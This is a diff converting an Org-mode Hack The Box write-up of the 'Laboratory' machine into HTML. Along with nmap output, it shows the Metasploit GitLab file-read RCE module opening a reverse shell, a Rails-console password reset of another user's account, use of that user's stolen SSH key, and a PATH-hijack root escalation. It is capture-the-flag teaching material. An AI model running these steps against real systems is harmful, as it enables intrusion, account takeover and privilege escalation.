@@ -1,30 +1,44 @@
-#+TITLE: Laboratory
-#+AUTHOR: Romeu Vieira
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Laboratory</title>
+<meta name="generator" content="Org mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Laboratory</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org0e8fa95">Enumeration</a></li>
+</ul>
+</div>
+</div>
 
-#+OPTIONS: html-style:nil
-#+OPTIONS: html-scripts:nil
 
-#+OPTIONS: author:nil
-#+OPTIONS: email:nil
-#+OPTIONS: date:t
 
-#+PROPERTY: header-args :eval no
-
-#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>
-
-#+EXPORT_FILE_NAME: laboratory
-
-* Enumeration
-
+<div id="outline-container-org0e8fa95" class="outline-2">
+<h2 id="org0e8fa95">Enumeration</h2>
+<div class="outline-text-2" id="text-org0e8fa95">
+<p>
 We start by using Nmap right away:
+</p>
 
-#+BEGIN_SRC
+<pre class="example">
 $ nmap -sC -sV -p1-65535 -oN nmapresult.txt 10.10.10.216
-#+END_SRC
+</pre>
 
+<p>
 And the result:
+</p>
 
-#+BEGIN_SRC
+<pre class="example">
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 10:44 WET
 Nmap scan report for 10.10.10.216
 Host is up (0.045s latency).
@@ -51,46 +65,62 @@ Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 119.42 seconds
-#+END_SRC
+</pre>
 
+<p>
 This result shows us three different open ports: 22, 80, 443.
-Under the port 443 entry, we can see this string =Subject Alternative Name:
-DNS:git.laboratory.htb=. This says that there is a subdomain. So in this case,
-we add it to the =/etc/hosts= file alongside the =laboratory.htb= one.
+Under the port 443 entry, we can see this string <code>Subject Alternative Name:
+DNS:git.laboratory.htb</code>. This says that there is a subdomain. So in this case,
+we add it to the <code>/etc/hosts</code> file alongside the <code>laboratory.htb</code> one.
+</p>
 
-By looking at the =laboratory.htb= website, we do not find anything interesting
-really. At least at a first glance. No URLs to other pages, no interesting JavaScript
+<p>
+By looking at the <code>laboratory.htb</code> website, we do not find anything interesting
+really. At least at a first glance. No URLs to other pages, no interesting JS
 files.
+</p>
 
-By checking =git.laboratory.htb=, we can clearly see that the first page, which
+<p>
+By checking <code>git.laboratory.htb</code>, we can clearly see that the first page, which
 is a sign in page, is a GitLab Community Edition instance! We can also register
 our own username here.
+</p>
 
-If we try to register, unfortunately, we get this error: =1 error prohibited this user from being saved=.
+<p>
+If we try to register, unfortunately, we get this error: <code>1 error prohibited this user from being saved</code>.
 Probably they want us to register with their own domain?
+</p>
 
-[[./images/img1.jpg]]
 
+<div id="org543e108" class="figure">
+<p><img src="./images/img1.jpg" alt="img1.jpg" />
+</p>
+</div>
+
+<p>
 And then, after successfuly registering, we are redirected to the dashboard.
 From here, the first thing we ought to know is what version of Gitlab is being
 used. We can rapidly know this by going to the question mark on the navigation
-bar and clicking =Help=. With this, we know we are working with =GitLab
-Community Edition Version 12.8.1=.
+bar and clicking <code>Help</code>. With this, we know we are working with <code>GitLab
+Community Edition Version 12.8.1</code>.
+</p>
 
-When searching Google for exploits, there is one result from [[https://hackerone.com/reports/827052][HackerOne]] that
+<p>
+When searching Google for exploits, there is one result from <a href="https://hackerone.com/reports/827052">HackerOne</a> that
 shows an Arbitrary File Read vulnerability tested in GitLab version 12.8.7. This
 version is higher than the one we are working with. Alongside this, there is a
 full explanation of how the exploit works. There’s even a video of a
 demonstration.
+</p>
 
-* User Flag
-
+<p>
 Metasploit has made our lives easier by having a script that does it all.
+</p>
 
-#+BEGIN_SRC
-msf6 > use exploit/multi/http/gitlab_file_read_rce
+<pre class="example">
+msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
 [*] No payload configured, defaulting to generic/shell_reverse_tcp
-msf6 exploit(multi/http/gitlab_file_read_rce) > show options
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; show options
 
 Module options (exploit/multi/http/gitlab_file_read_rce):
 
@@ -99,7 +129,7 @@ Module options (exploit/multi/http/gitlab_file_read_rce):
    DEPTH            15                                                            yes       Define the max traversal depth
    PASSWORD                                                                       no        The password for the specified username
    Proxies                                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                                                                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RHOSTS                                                                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
    RPORT            80                                                            yes       The target port (TCP)
    SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  yes       The path to the secrets.yml file
    SECRET_KEY_BASE                                                                no        The known secret_key_base from the secrets.yml - this skips the arbitrary file read if present
@@ -124,22 +154,22 @@ Exploit target:
    0   Automatic
 
 
-msf6 exploit(multi/http/gitlab_file_read_rce) > set PASSWORD testregister1
-PASSWORD => testregister1
-msf6 exploit(multi/http/gitlab_file_read_rce) > set USERNAME testregister1
-USERNAME => testregister1
-msf6 exploit(multi/http/gitlab_file_read_rce) > set VHOST git.laboratory.htb
-VHOST => git.laboratory.htb
-msf6 exploit(multi/http/gitlab_file_read_rce) > set LHOST 10.10.14.30
-LHOST => 10.10.14.30
-msf6 exploit(multi/http/gitlab_file_read_rce) > set RHOSTS 10.10.10.216
-RHOSTS => 10.10.10.216
-msf6 exploit(multi/http/gitlab_file_read_rce) > set RPORT 443
-RPORT => 443
-msf6 exploit(multi/http/gitlab_file_read_rce) > set SSL true
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; set PASSWORD testregister1
+PASSWORD =&gt; testregister1
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; set USERNAME testregister1
+USERNAME =&gt; testregister1
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; set VHOST git.laboratory.htb
+VHOST =&gt; git.laboratory.htb
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; set LHOST 10.10.14.30
+LHOST =&gt; 10.10.14.30
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; set RHOSTS 10.10.10.216
+RHOSTS =&gt; 10.10.10.216
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; set RPORT 443
+RPORT =&gt; 443
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; set SSL true
 [!] Changing the SSL option's value may require changing RPORT!
-SSL => true
-msf6 exploit(multi/http/gitlab_file_read_rce) > exploit
+SSL =&gt; true
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; exploit
 
 [*] Started reverse TCP handler on 10.10.14.30:4444
 [*] Executing automatic check (disable AutoCheck to override)
@@ -156,112 +186,147 @@ msf6 exploit(multi/http/gitlab_file_read_rce) > exploit
 [*] Deleted project /testregister1/bmfJNdMh
 [*] Attempting to delete project /testregister1/g4kCDTHP
 [*] Deleted project /testregister1/g4kCDTHP
-[*] Command shell session 1 opened (10.10.14.30:4444 -> 10.10.10.216:42322) at 2021-02-06 18:20:07 +0000
+[*] Command shell session 1 opened (10.10.14.30:4444 -&gt; 10.10.10.216:42322) at 2021-02-06 18:20:07 +0000
 
 ls -la
 total 8
 drwx------ 2 git root 4096 Jul  2  2020 .
 drwxr-xr-x 9 git root 4096 Feb  6 16:24 ..
 
-#+END_SRC
+</pre>
 
-Now having a reverse shell, we find out that we are the =git= user.
+<p>
+Now having a reverse shell, we find out that we are the <code>git</code> user.
 Let’s try messing around with the Gitlab Rails Console:
+</p>
 
-#+BEGIN_SRC
+<pre class="example">
 $ gitlab-rails console
-#+END_SRC
+</pre>
 
-There is a cheat-sheet with some commands, from [[https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html][GitLab]].
+<p>
+There is a cheat-sheet with some commands, from <a href="https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html">GitLab</a>.
 There are some commands to find users, one of them being
-=User.find_by_username('someuser')=. What seems logical to try first is using
-this command but trying to find =admin= instead. Unfortunately, zero results.
-Maybe we can execute something like =find_by_id=?
+<code>User.find_by_username('someuser')</code>. What seems logical to try first is using
+this command but trying to find <code>admin</code> instead. Unfortunately, zero results.
+Maybe we can execute something like <code>find_by_id</code>?
+</p>
 
-We know there is a user called =dexter=. Wonder if we can change the user data.
-There is another [[https://docs.gitlab.com/ee/administration/troubleshooting/navigating_gitlab_via_rails_console.html][GitLab link]] that is very helpful.
+<p>
+We know there is a user called <code>dexter</code>. Wonder if we can change the user data.
+There is another <a href="https://docs.gitlab.com/ee/administration/troubleshooting/navigating_gitlab_via_rails_console.html">GitLab link</a> that is very helpful.
+</p>
 
-[[./images/img3.jpg]]
 
-Let’s try setting our own password for =dexter=:
+<div id="orgd5b66ec" class="figure">
+<p><img src="./images/img3.jpg" alt="img3.jpg" />
+</p>
+</div>
 
-#+BEGIN_SRC
+<p>
+Let’s try setting our own password for <code>dexter</code>:
+</p>
+
+<pre class="example">
 $ user = User.find_by_id(1)
 $ user.password = ‘password’
 $ user.password_confirmation = ‘password’
 $ user.save!
-#+END_SRC
+</pre>
 
-Now if we go back to =https://git.laboratory.htb/= and login with
-=dexter:password=, we succeed! Let’s check his repositories.
+<p>
+Now if we go back to <code>https://git.laboratory.htb/</code> and login with
+<code>dexter:password</code>, we succeed! Let’s check his repositories.
+</p>
 
-One of them is called =securedocker= and has =CONFIDENTIAL!= in its description.
-If we dig in, we can find the users’ =id_rsa= in the =.ssh= folder.
+<p>
+One of them is called <code>securedocker</code> and has <code>CONFIDENTIAL!</code> in its description.
+If we dig in, we can find the users’ <code>id_rsa</code> in the <code>.ssh</code> folder.
+</p>
 
-[[./images/img4.jpg]]
 
+<div id="orgd149e93" class="figure">
+<p><img src="./images/img4.jpg" alt="img4.jpg" />
+</p>
+</div>
+
+<p>
 We download the file, set permissions to 400 and login:
+</p>
 
-#+BEGIN_SRC
+<pre class="example">
 $ chmod 400 id_rsa
 $ ssh -i id_rsa dexter@10.10.10.216
 dexter@laboratory:~$
-#+END_SRC
+</pre>
 
+<p>
 After that, we just get the user flag!
+</p>
 
-* Root Flag
-
-Now, we don’t have the user password, so we can’t actually run =sudo -l= to
+<p>
+Now, we don’t have the user password, so we can’t actually run <code>sudo -l</code> to
 check if the user can run some program as superuser.
-One thing we can do this use the =find= command to check SUID executable
+One thing we can do this use the <code>find</code> command to check SUID executable
 binaries:
+</p>
 
-#+BEGIN_SRC
-$ find / -perm -4000 -type f -print 2>/dev/null
-#+END_SRC
+<pre class="example">
+$ find / -perm -4000 -type f -print 2&gt;/dev/null
+</pre>
 
+<p>
 There are many binaries here and we can use
-[[https://gtfobins.github.io/][GTFOBins]] to check if there are binaries we can get the advantage of because of SUID.
-In =/usr/bin= all binaries are useless. But there is one in =/usr/local/bin/=
-called =docker-security=. Running it yields no results, but we can use =ltrace= to see what it is trying to do during runtime:
+<a href="https://gtfobins.github.io/">GTFOBins</a> to check if there are binaries we can get the advantage of because of SUID.
+In <code>/usr/bin</code> all binaries are useless. But there is one in <code>/usr/local/bin/</code>
+called <code>docker-security</code>. Running it yields no results, but we can use <code>ltrace</code> to see what it is trying to do during runtime:
+</p>
 
-#+BEGIN_SRC
+<pre class="example">
 $ ltrace /usr/local/bin/docker-security
 
 setuid(0)                                                                                                                                          = -1
 setgid(0)                                                                                                                                          = -1
 system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
- <no return ...>
+ &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
-<... system resumed> )                                                                                                                             = 256
+&lt;... system resumed&gt; )                                                                                                                             = 256
 system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
- <no return ...>
+ &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
-<... system resumed> )                                                                                                                             = 256
+&lt;... system resumed&gt; )                                                                                                                             = 256
 +++ exited (status 0) +++
-#+END_SRC
+</pre>
 
-As expected, it sets =uid= and =gid= to =0=.
-It is also trying to run =chmod=. So we can spoof this binary using =$PATH= to
+<p>
+As expected, it sets <code>uid</code> and <code>gid</code> to <code>0</code>.
+It is also trying to run <code>chmod</code>. So we can spoof this binary using <code>$PATH</code> to
 spawn a root shell!
+</p>
 
+<p>
 The steps to do this are simple:
+</p>
 
-#+begin_src
+<pre class="example">
 $ cd /tmp
-$ echo “/bin/bash” > chmod
+$ echo “/bin/bash” &gt; chmod
 $ export PATH=/tmp:$PATH
 $ echo $PATH # just to check
 $ ./usr/local/bin/docker-security
-#+end_src
+</pre>
 
+<p>
 Root permissions! :-)
+</p>
 
-#+BEGIN_EXPORT html
 <hr>
 <footer>
 <p><a class="footer" href="/index.html">Homepage</a></p>
 <p><a class="footer" href="/writeups/htb/index.html">Back</a></p>
 </footer>
-#+END_EXPORT
+</div>
+</div>
+</div>
+</body>
+</html>
